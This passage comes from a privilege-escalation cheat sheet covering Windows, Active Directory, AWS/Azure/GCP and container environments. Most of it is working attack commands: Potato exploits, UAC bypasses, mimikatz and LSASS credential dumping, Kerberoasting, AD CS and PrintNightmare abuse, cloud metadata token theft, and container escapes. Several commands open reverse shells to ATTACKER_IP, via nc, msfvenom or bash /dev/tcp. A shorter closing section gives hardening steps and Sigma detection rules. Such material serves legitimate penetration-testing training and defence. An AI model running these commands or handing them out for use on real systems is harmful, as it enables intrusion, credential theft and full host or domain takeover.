:: Exploits DCOM/RPC for impersonation

GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\nc.exe ATTACKER_IP 4444 -e cmd.exe"
```

#### CoercedPotato

```cmd
:: Combines multiple coercion techniques
:: Targets: EfsRpc, SpoolSample, PetitPotam, PrintNightmare vectors

CoercedPotato.exe -cmd "cmd /c net localgroup administrators user /add"
```

### 5.3 AlwaysInstallElevated

```cmd
:: Verify both registry keys are set to 1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

:: Generate malicious MSI
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi > evil.msi

:: Execute (will install as SYSTEM)
msiexec /quiet /qn /i evil.msi
```

Custom MSI with embedded PowerShell:

```powershell
# Using WiX Toolset to create custom MSI
# Product.wxs:
# <CustomAction Id="RunCmd" Execute="deferred" Impersonate="no"
#   BinaryKey="WixCA" DllEntry="CAQuietExec"
#   Return="ignore" />
# With command: powershell -enc <BASE64_PAYLOAD>
```

### 5.4 UAC Bypass Techniques

```powershell
# Check current integrity level
whoami /groups | findstr "Level"
# Medium Mandatory Level = UAC restricted
# High Mandatory Level = Elevated

# Fodhelper UAC bypass (Windows 10)
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"

# Eventvwr UAC bypass (Windows 10)
New-Item "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\mscfile\Shell\Open\command" -Name "(default)" -Value "cmd /c start C:\temp\shell.exe" -Force
Start-Process "C:\Windows\System32\eventvwr.exe"

# ComputerDefaults UAC bypass
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "C:\temp\shell.exe" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"
```

### 5.5 Credential Harvesting

#### SAM Database Dump

```cmd
:: If SeBackupPrivilege is available:
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM

:: Extract hashes offline:
impacket-secretsdump -sam SAM -system SYSTEM LOCAL

:: Volume Shadow Copy method (requires admin, useful for NTDS.dit)
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\SYSTEM
```

#### DPAPI Secret Extraction

```powershell
# DPAPI protects credentials for the current user
# Mimikatz approach:
mimikatz# sekurlsa::dpapi
mimikatz# dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\{GUID}

# SharpDPAPI (C# implementation):
.\SharpDPAPI.exe triage
.\SharpDPAPI.exe credentials /target:C:\Users\user\AppData\
```

#### Cached Credentials

```cmd
:: Using Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
mimikatz# sekurlsa::wdigest
mimikatz# lsadump::sam
mimikatz# lsadump::secrets
mimikatz# lsadump::cache

:: From LSASS dump:
procdump.exe -ma lsass.exe lsass.dmp
mimikatz# sekurlsa::minidump lsass.dmp
mimikatz# sekurlsa::logonPasswords
```

### 5.6 Scheduled Task Manipulation

```powershell
# Find tasks with writable scripts or binaries
$tasks = Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
foreach ($task in $tasks) {
    $actions = $task.Actions
    foreach ($action in $actions) {
        if ($action.Execute) {
            $acl = Get-Acl $action.Execute -ErrorAction SilentlyContinue
            if ($acl) {
                $writable = $acl.Access | Where-Object {
                    $_.IdentityReference -match $env:USERNAME -and
                    $_.FileSystemRights -match "Write|FullControl|Modify"
                }
                if ($writable) {
                    Write-Output "VULNERABLE: $($task.TaskName) -> $($action.Execute)"
                }
            }
        }
    }
}

# Replace writable task binary
copy C:\temp\shell.exe "C:\Program Files\Task\original.exe"
# Wait for scheduled execution
```

### 5.7 Registry Autorun Abuse

```cmd
:: Check autorun registry keys
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

:: Check if autorun binary path is writable
icacls "C:\Program Files\Autorun\app.exe"

:: If writable — replace with payload
copy /y C:\temp\shell.exe "C:\Program Files\Autorun\app.exe"
:: Triggers on next login of the affected user
```

---

## 6. Active Directory Privilege Escalation

### 6.1 Kerberoasting

Extract service account TGS tickets and crack them offline for plaintext passwords.

```powershell
# Using Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Using Impacket
impacket-GetUserSPNs DOMAIN/user:password -dc-ip DC_IP -request -outputfile hashes.txt

# Using PowerView
Import-Module .\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tickets.csv

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# Crack with john
john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
```

### 6.2 AS-REP Roasting

Target accounts with "Do not require Kerberos preauthentication" enabled.

```powershell
# Enumerate vulnerable accounts
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# Using Rubeus
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt

# Using Impacket (no credentials needed if you have a user list)
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -format hashcat -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

### 6.3 ACL Abuse

#### WriteDACL

```powershell
# If you have WriteDACL on a user/group:
# Grant yourself GenericAll
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity currentuser -Rights All

# Using .NET
$target = [ADSI]"LDAP://CN=Domain Admins,CN=Users,DC=domain,DC=local"
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
    [System.Security.Principal.NTAccount]"DOMAIN\currentuser",
    "GenericAll", "Allow"
)
$target.ObjectSecurity.AddAccessRule($ace)
$target.CommitChanges()
```

#### GenericAll

```powershell
# GenericAll on a user — reset their password
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString "NewP@ss123!" -AsPlainText -Force)

# GenericAll on a group — add yourself
Add-ADGroupMember -Identity "Domain Admins" -Members currentuser

# GenericAll on a computer — RBCD attack (see below)
```

#### ForceChangePassword

```powershell
# Change target user's password without knowing current password
Set-ADAccountPassword -Identity targetuser -Reset -NewPassword (ConvertTo-SecureString "NewP@ss!" -AsPlainText -Force)

# Using rpcclient
rpcclient -U "DOMAIN/user%password" DC_IP
> setuserinfo2 targetuser 23 'NewP@ss!'
```

### 6.4 Group Policy Abuse

```powershell
# If you have write access to a GPO linked to Domain Controllers or high-value OUs:

# Using SharpGPOAbuse
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Backdoor" --Author "NT AUTHORITY\SYSTEM" --Command "cmd.exe" --Arguments "/c net localgroup administrators DOMAIN\user /add" --GPOName "Vulnerable GPO"

# Immediate scheduled task (executes on next GPO refresh)
.\SharpGPOAbuse.exe --AddImmediateTask --TaskName "Escalate" --Author "DOMAIN\admin" --Command "cmd.exe" --Arguments "/c powershell -enc BASE64PAYLOAD" --GPOName "Vuln GPO"

# Force GPO update on targets
Invoke-GPUpdate -Computer "TARGET" -Force
```

### 6.5 AD CS Exploitation (ESC1-ESC8)

Active Directory Certificate Services abuse is one of the most impactful modern AD escalation paths.

#### ESC1 — Misconfigured Certificate Templates

```bash
# Enumerate vulnerable templates using Certipy
certipy find -u user@domain.local -p 'password' -dc-ip DC_IP -vulnerable

# ESC1 conditions:
# - Client Authentication or Smart Card Logon EKU
# - ENROLLEE_SUPPLIES_SUBJECT flag enabled
# - Low-privilege user has enrollment rights

# Exploit: Request certificate for Domain Admin
certipy req -u user@domain.local -p 'password' -ca CA-NAME -target DC_IP -template VulnTemplate -upn administrator@domain.local

# Authenticate with the certificate
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

#### ESC4 — Vulnerable Certificate Template ACL

```bash
# If you have write access to a template:
certipy template -u user@domain.local -p 'password' -template VulnTemplate -save-old

# Modify template to make it ESC1 vulnerable
# Then exploit as ESC1
certipy req -u user@domain.local -p 'password' -ca CA-NAME -target DC_IP -template VulnTemplate -upn administrator@domain.local
```

#### ESC8 — NTLM Relay to AD CS Web Enrollment

```bash
# Set up NTLM relay to the CA's web enrollment endpoint
impacket-ntlmrelayx -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Coerce authentication from DC (PetitPotam, PrinterBug, etc.)
python3 PetitPotam.py RELAY_IP DC_IP

# Use the obtained certificate
certipy auth -pfx dc.pfx -dc-ip DC_IP
```

### 6.6 Print Spooler Exploitation

#### PrintNightmare (CVE-2021-34527)

```python
# Remote code execution via Print Spooler
# Using cube0x0's implementation:
python3 CVE-2021-34527.py 'domain/user:password@DC_IP' '\\ATTACKER_IP\share\evil.dll'

# Pre-requisites:
# - SMB share hosting malicious DLL
# - Print Spooler service running on target
# - Target reachable on port 445

# Malicious DLL (executes as SYSTEM):
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f dll > evil.dll
```

#### SpoolSample (Printer Bug)

```powershell
# Coerce authentication from a target machine's computer account
# Used as a trigger for relay attacks

.\SpoolSample.exe TARGET_DC ATTACKER_IP

# The target DC authenticates to your machine
# Relay this authentication to another service (LDAP, HTTP/AD CS, etc.)
```

### 6.7 PetitPotam

```bash
# Coerce NTLM authentication via EFSRPC
python3 PetitPotam.py LISTENER_IP TARGET_IP

# Unauthenticated variant (patched but still works in some environments)
python3 PetitPotam.py -d '' -u '' -p '' LISTENER_IP TARGET_IP

# Chain with NTLM relay to AD CS (ESC8):
# 1. Start relay: impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp --adcs
# 2. Trigger: python3 PetitPotam.py RELAY_IP DC_IP
# 3. Obtain DC certificate
# 4. Request TGT with certificate
# 5. DCSync
```

### 6.8 Shadow Credentials

```bash
# If you have write access to msDS-KeyCredentialLink attribute:
# Add shadow credential to target (computer or user)

# Using Whisker (C#)
.\Whisker.exe add /target:DC01$ /domain:domain.local /dc:DC01.domain.local

# Using pywhisker (Python)
python3 pywhisker.py -d domain.local -u user -p 'password' --target 'DC01$' --action add

# Authenticate with the created PKCS12 certificate
certipy auth -pfx output.pfx -dc-ip DC_IP

# Or using Rubeus with the generated certificate
.\Rubeus.exe asktgt /user:DC01$ /certificate:cert.pfx /password:password /getcredentials
```

### 6.9 Resource-Based Constrained Delegation (RBCD) Abuse

```powershell
# Requirements:
# - Write access to msDS-AllowedToActOnBehalfOfOtherIdentity on target
# - A computer account you control (or ability to create one — MachineAccountQuota > 0)

# Step 1: Create a computer account
impacket-addcomputer domain.local/user:password -computer-name 'FAKEPC$' -computer-pass 'FakePass123!'

# Step 2: Set RBCD on target
impacket-rbcd domain.local/user:password -delegate-to 'TARGET$' -delegate-from 'FAKEPC$' -dc-ip DC_IP -action write

# Step 3: Request service ticket via S4U2Self + S4U2Proxy
impacket-getST domain.local/'FAKEPC$':'FakePass123!' -spn cifs/TARGET.domain.local -impersonate Administrator -dc-ip DC_IP

# Step 4: Use the ticket
export KRB5CCNAME=Administrator@cifs_TARGET.domain.local@DOMAIN.LOCAL.ccache
impacket-psexec -k -no-pass domain.local/Administrator@TARGET.domain.local
```

---

## 7. Cloud Privilege Escalation

### 7.1 AWS

#### IAM Policy Exploitation

```bash
# Enumerate current permissions
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d'/' -f2)
aws iam list-user-policies --user-name USERNAME

# Check for dangerous policies
# iam:CreatePolicyVersion — overwrite your own policy
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/POLICY_NAME --policy-document '{
  "Version": "2012-10-17",
  "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
}' --set-as-default

# iam:AttachUserPolicy — attach AdministratorAccess to yourself
aws iam attach-user-policy --user-name YOUR_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# iam:CreateLoginProfile / iam:UpdateLoginProfile — set console password for another user
aws iam create-login-profile --user-name admin --password 'NewP@ssw0rd!' --no-password-reset-required
```

#### Lambda Privilege Escalation

```bash
# If you can create Lambda functions with a more privileged role:
# Create function that assumes the privileged role

cat > escalate.py << 'EOF'
import boto3
import json

def handler(event, context):
    client = boto3.client('iam')
    # Attach admin policy to attacker user
    client.attach_user_policy(
        UserName='attacker-user',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'statusCode': 200, 'body': json.dumps('Escalated!')}
EOF

zip escalate.zip escalate.py

aws lambda create-function \
    --function-name escalate \
    --runtime python3.9 \
    --role arn:aws:iam::ACCOUNT:role/PRIVILEGED_ROLE \
    --handler escalate.handler \
    --zip-file fileb://escalate.zip

aws lambda invoke --function-name escalate output.json
```

#### EC2 Instance Profile Abuse

```bash
# If you can launch EC2 instances or modify instance profiles:
# Launch instance with privileged IAM role

aws ec2 run-instances \
    --image-id ami-XXXXXXXX \
    --instance-type t2.micro \
    --iam-instance-profile Name=AdminRole \
    --key-name your-key

# SSH in and steal credentials from metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole
```

#### Cross-Account Role Assumption

```bash
# If sts:AssumeRole is allowed and trust policy is misconfigured:
aws sts assume-role --role-arn arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole --role-session-name escalation

# Check for wildcard trust policies:
# "Principal": {"AWS": "*"}  ← allows ANY AWS account to assume
```

### 7.2 Azure

#### Contributor to Owner

```powershell
# If you have Contributor role, you can sometimes escalate to Owner via:
# 1. Custom role definition (if Microsoft.Authorization/roleAssignments/write is available)
# 2. Automation Account with RunAs certificate
# 3. Key Vault access leading to service principal credentials

# Check current role assignments
az role assignment list --assignee OBJECT_ID --all

# Exploit Automation Account RunAs
# If you have access to an Automation Account:
$connection = Get-AutomationConnection -Name AzureRunAsConnection
Connect-AzAccount -ServicePrincipal -Tenant $connection.TenantId -ApplicationId $connection.ApplicationId -CertificateThumbprint $connection.CertificateThumbprint
# This service principal often has Contributor or Owner on the subscription
```

#### Managed Identity Exploitation

```bash
# From a compromised Azure VM with managed identity:
# Obtain token from IMDS
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Use token to enumerate permissions
az login --identity
az role assignment list --assignee $(az account show --query user.name -o tsv) --all

# If the managed identity has high privileges on other resources:
az vm run-command invoke --resource-group RG --name TARGET_VM --command-id RunPowerShellScript --scripts "whoami"
```

#### Azure AD Role Abuse

```powershell
# Enumerate Azure AD roles
Get-AzureADDirectoryRole
Get-AzureADDirectoryRoleMember -ObjectId ROLE_OBJECT_ID

# If you have Global Administrator or Privileged Role Administrator:
# Assign any role to yourself
New-AzureADMSRoleAssignment -DirectoryScopeId '/' -RoleDefinitionId ROLE_ID -PrincipalId YOUR_OBJECT_ID

# Application Administrator can add credentials to service principals
New-AzureADServicePrincipalKeyCredential -ObjectId SP_OBJECT_ID -Type AsymmetricX509Cert -Value $certBytes
```

### 7.3 GCP

#### Service Account Key Creation

```bash
# If iam.serviceAccountKeys.create permission exists:
gcloud iam service-accounts keys create key.json --iam-account=privileged-sa@PROJECT.iam.gserviceaccount.com

# Activate and use
gcloud auth activate-service-account --key-file=key.json
gcloud projects get-iam-policy PROJECT_ID
```

#### Service Account Impersonation

```bash
# If iam.serviceAccounts.getAccessToken is granted:
gcloud auth print-access-token --impersonate-service-account=admin-sa@PROJECT.iam.gserviceaccount.com

# Use the token
curl -H "Authorization: Bearer $(gcloud auth print-access-token --impersonate-service-account=admin-sa@PROJECT.iam.gserviceaccount.com)" \
    "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:getIamPolicy"
```

#### Compute Metadata Exploitation

```bash
# From a compromised GCP VM:
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# Get project-wide SSH keys
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# If setMetadata permission exists, add your SSH key to project:
gcloud compute project-info add-metadata --metadata=ssh-keys="attacker:$(cat ~/.ssh/id_rsa.pub)"
```

### 7.4 Kubernetes (Cloud IAM Bridge)

```bash
# From a compromised pod, check for cloud credentials:

# AWS EKS — IRSA (IAM Roles for Service Accounts)
cat /var/run/secrets/eks.amazonaws.com/serviceaccount/token
# Decode JWT to see the IAM role ARN

# GKE — Workload Identity
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# AKS — Azure AD Workload Identity
cat /var/run/secrets/azure/tokens/azure-identity-token

# If node IAM role is overprivileged:
# Access IMDS from pod (if not blocked by NetworkPolicy)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

---

## 8. Container Privilege Escalation

### 8.1 Docker Privilege Escalation

#### Privileged Flag

```bash
# Check if running in privileged mode
cat /proc/self/status | grep -i "capeff"
# CapEff: 0000003fffffffff ← all capabilities = privileged

# Escape from privileged container:
# Mount host filesystem
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host bash

# Or via cgroup release_agent:
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/escalate
echo 1 > $d/escalate/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > $d/release_agent
echo '#!/bin/bash' > /cmd
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /cmd
chmod +x /cmd
sh -c "echo \$\$ > $d/escalate/cgroup.procs"
```

#### Capabilities Abuse in Containers

```bash
# Check container capabilities
capsh --print
cat /proc/self/status | grep Cap

# CAP_SYS_ADMIN — mount filesystems, enable BPF, etc.
mount /dev/sda1 /mnt
# Or use nsenter to access host namespaces

# CAP_SYS_PTRACE — trace and inject into processes
# Inject into a host process (if PID namespace is shared)
nsenter -t 1 -m -u -i -n -p -- /bin/bash

# CAP_NET_ADMIN — manipulate network
# ARP spoofing within container network
```

#### Docker Socket Mount

```bash
# If /var/run/docker.sock is mounted inside container:
ls -la /var/run/docker.sock

# Spawn privileged container with host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt bash

# Or if docker binary is not available, use curl:
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock -X POST \
    "http://localhost/containers/create" \
    -H "Content-Type: application/json" \
    -d '{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}'
```

#### Volume Mount Exploitation

```bash
# If sensitive host paths are mounted:
# /etc mounted → modify /etc/passwd, /etc/shadow, /etc/crontab
# /root mounted → read SSH keys, bash_history
# /var/run/docker.sock → full host control (see above)
# /proc/sys mounted → modify kernel parameters

# Check mounted volumes
mount | grep -v "proc\|sys\|dev"
cat /proc/mounts
df -h
```

### 8.2 Kubernetes Privilege Escalation

#### Pod with hostPID

```yaml
# If a pod has hostPID: true
# You can see all host processes and potentially inject into them
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  hostPID: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"]
    securityContext:
      privileged: true
```

```bash
# From inside a hostPID pod:
ps aux  # see all host processes
nsenter -t 1 -m -u -i -n -p -- /bin/bash  # root shell on host
```

#### hostNetwork

```bash
# With hostNetwork: true, you share the host's network namespace
# Access services bound to 127.0.0.1 on the node
# Access the kubelet API directly
curl -sk https://localhost:10250/pods

# Access cloud metadata from node's perspective
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

#### Service Account Token Exploitation

```bash
# Default service account token location
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# Use token to query API server
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api/v1/namespaces/default/secrets

# If the service account has cluster-admin or can create pods:
# Create a privileged pod on a specific node for node-level access
```

#### Node Access via Pod

```bash
# If you can create pods, you can target specific nodes:
kubectl run escape --image=alpine --overrides='{
  "spec": {
    "nodeName": "target-node",
    "hostPID": true,
    "hostNetwork": true,
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- /bin/bash"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
  }
}' --restart=Never -it
```

### 8.3 Container Escape as Privilege Escalation

The progression from container user to host root:

```
Container User (www-data/appuser)
    │
    ├── [1] Exploit container vuln → Container Root
    │       └── If privileged: mount host FS → Host Root
    │       └── If docker.sock: spawn privileged container → Host Root
    │       └── If hostPID: nsenter → Host Root
    │
    ├── [2] Exploit host kernel from container
    │       └── DirtyPipe/DirtyCow if kernel is vulnerable
    │       └── CVE-2022-0185 (filesystem context exploit)
    │       └── CVE-2022-0847 targeting host files via /proc
    │
    └── [3] Namespace abuse
            └── User namespace remapping bypass
            └── Exploiting shared namespaces
            └── cgroup escape (release_agent)
```

### 8.4 Namespace Abuse

```bash
# If user namespaces are configured but exploitable:
# Check namespace configuration
ls -la /proc/self/ns/
cat /proc/self/uid_map
cat /proc/self/gid_map

# If unshare is available and user namespace creation is allowed:
unshare -Urm
# You are now root in a new user namespace
# This doesn't give host root, but can bypass some container restrictions

# Exploiting PID namespace sharing
# If PID namespace is shared with host:
ls /proc/*/root  # navigate to host processes' root filesystem
cat /proc/1/root/etc/shadow  # read host files through /proc
```

---

## 9. Defense and Detection

### 9.1 Linux Hardening

#### Sudo Configuration

```bash
# /etc/sudoers best practices:
# NEVER use NOPASSWD for interactive shells (bash, sh, python, etc.)
# NEVER use wildcards in paths: /usr/bin/* is dangerous
# NEVER preserve dangerous env vars (LD_PRELOAD, LD_LIBRARY_PATH, PYTHONPATH)

# Remove dangerous defaults
Defaults        env_reset
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
Defaults        !env_keep
Defaults        use_pty
Defaults        logfile="/var/log/sudo.log"
Defaults        log_input, log_output

# Specific allowances only
user ALL=(root) /usr/bin/systemctl restart nginx
```

#### SUID Cleanup

```bash
# Audit SUID binaries
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Remove SUID from unnecessary binaries
chmod u-s /usr/bin/unnecessary_suid_binary

# Monitor for new SUID files
# /etc/aide/aide.conf:
# /usr/bin SUID
# /usr/sbin SUID
# /usr/local/bin SUID
```

#### Capability Hardening

```bash
# Remove unnecessary capabilities
setcap -r /usr/bin/unnecessary_binary

# Audit capabilities
getcap -r / 2>/dev/null

# Use capability bounding sets in systemd services:
# [Service]
# CapabilityBoundingSet=CAP_NET_BIND_SERVICE
# AmbientCapabilities=CAP_NET_BIND_SERVICE
# NoNewPrivileges=true
```

#### File Integrity Monitoring (AIDE)

```bash
# Install and configure AIDE
apt install aide
aideinit

# Key configuration in /etc/aide/aide.conf:
/etc/passwd CONTENT_EX
/etc/shadow CONTENT_EX
/etc/sudoers CONTENT_EX
/usr/bin SUID+SGID
/usr/sbin SUID+SGID

# Regular checks (run via cron as root):
aide --check
aide --update
```

#### Process Monitoring

```bash
# auditd rules for privilege escalation detection
# /etc/audit/rules.d/escalation.rules:

# Monitor sudo usage
-w /etc/sudoers -p wa -k sudoers_changes
-w /etc/sudoers.d/ -p wa -k sudoers_changes

# Monitor passwd/shadow changes
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/group -p wa -k identity

# Monitor SUID/SGID changes
-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -k perm_mod

# Monitor privilege escalation syscalls
-a always,exit -F arch=b64 -S setuid,setgid,setreuid,setregid -F auid>=1000 -k priv_esc

# Monitor kernel module loading
-w /sbin/insmod -p x -k modules
-w /sbin/modprobe -p x -k modules
-a always,exit -F arch=b64 -S init_module,finit_module -k modules
```

### 9.2 Windows Hardening

#### LSA Protection

```powershell
# Enable LSA Protection (RunAsPPL)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f

# Enable Credential Guard (Windows 10 Enterprise/Education)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 1 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LsaCfgFlags /t REG_DWORD /d 1 /f

# Verify Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```

#### Service Hardening

```powershell
# Set proper service permissions
sc sdset ServiceName "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"

# Remove unnecessary services
Get-Service | Where-Object {$_.Status -eq "Running"} | Select-Object Name, DisplayName, StartType

# Disable Print Spooler on servers that don't need it
Stop-Service -Name Spooler
Set-Service -Name Spooler -StartupType Disabled

# Restrict named pipe access
# Group Policy: Computer Configuration > Windows Settings > Security Settings > Local Policies > Security Options
# "Network access: Restrict clients allowed to make remote calls to SAM"
```

#### AppLocker / WDAC

```powershell
# AppLocker — application whitelisting
# Create default rules then customize
Get-AppLockerPolicy -Effective | Format-List

# Windows Defender Application Control (WDAC) — more robust than AppLocker
# Create policy from gold image
New-CIPolicy -FilePath "C:\policies\InitialPolicy.xml" -Level Publisher -Fallback Hash

# Deploy WDAC policy
ConvertFrom-CIPolicy "C:\policies\Policy.xml" "C:\policies\Policy.bin"
Copy-Item "C:\policies\Policy.bin" "C:\Windows\System32\CodeIntegrity\SIPolicy.p7b"
```

#### Proper ACLs

```powershell
# Audit service binary permissions
Get-WmiObject Win32_Service | ForEach-Object {
    $path = $_.PathName -replace '"', '' -replace ' /.*', '' -replace ' -.*', ''
    if (Test-Path $path) {
        $acl = Get-Acl $path
        $vulnerable = $acl.Access | Where-Object {
            $_.IdentityReference -match "Everyone|Users|Authenticated Users" -and
            $_.FileSystemRights -match "Write|FullControl|Modify"
        }
        if ($vulnerable) {
            Write-Warning "VULNERABLE: $($_.Name) - $path"
        }
    }
}

# Fix permissions
icacls "C:\Program Files\Service\binary.exe" /inheritance:r /grant:r "SYSTEM:(RX)" /grant:r "Administrators:(RX)"
```

### 9.3 Detection Rules

#### Sigma Rules for Common Techniques

```yaml
# Sigma rule: SUID binary creation
title: SUID Binary Creation
status: stable
logsource:
  product: linux
  service: auditd
detection:
  selection:
    type: SYSCALL
    syscall: chmod
    a1|contains: '4'
  condition: selection
level: high
tags:
  - attack.privilege_escalation
  - attack.t1548.001

---
# Sigma rule: Suspicious sudo usage
title: Sudo Command With Shell Execution
status: stable
logsource:
  product: linux
  service: syslog
detection:
  selection:
    message|contains:
      - 'sudo'
    message|contains:
      - '/bin/bash'
      - '/bin/sh'
      - 'python'
      - 'perl'
      - 'ruby'
  condition: selection
level: medium
tags:
  - attack.privilege_escalation
  - attack.t1548.003

---
# Sigma rule: Windows - Potential Potato Privilege Escalation
title: Potato Privilege Escalation Tool Execution
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith:
      - '\JuicyPotato.exe'
      - '\RoguePotato.exe'
      - '\PrintSpoofer.exe'
      - '\GodPotato.exe'
      - '\CoercedPotato.exe'
  selection_cmdline:
    CommandLine|contains:
      - 'JuicyPotato'
      - 'RoguePotato'
      - 'PrintSpoofer'
      - 'GodPotato'
  condition: selection or selection_cmdline
level: critical
tags:
  - attack.privilege_escalation
  - attack.t1134.001

---
# Sigma rule: Service Binary Path Modification
title: Suspicious Service Binary Path Modification
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\sc.exe'
    CommandLine|contains: 'config'
    CommandLine|contains: 'binpath'
  condition: selection
level: high
tags:
  - attack.privilege_escalation
  - attack.t1543.003
```

#### EDR Detection Indicators

```
# Process behavior indicators for EDR solutions:

1. Privilege Escalation via Token Manipulation:
   - Process creates token with higher privileges
   - Named pipe impersonation (CreateNamedPipe → ImpersonateNamedPipeClient)
   - CreateProcessWithToken or CreateProcessAsUser calls from non-admin

2. Kernel Exploit Indicators:
   - Process with low integrity spawning high integrity child
   - Sudden UID change (Linux) without sudo/su
   - Memory allocation in kernel address space from userland

3. Service Exploitation:
   - Service binary replacement (file write to service path)
   - sc.exe config changes from non-admin accounts
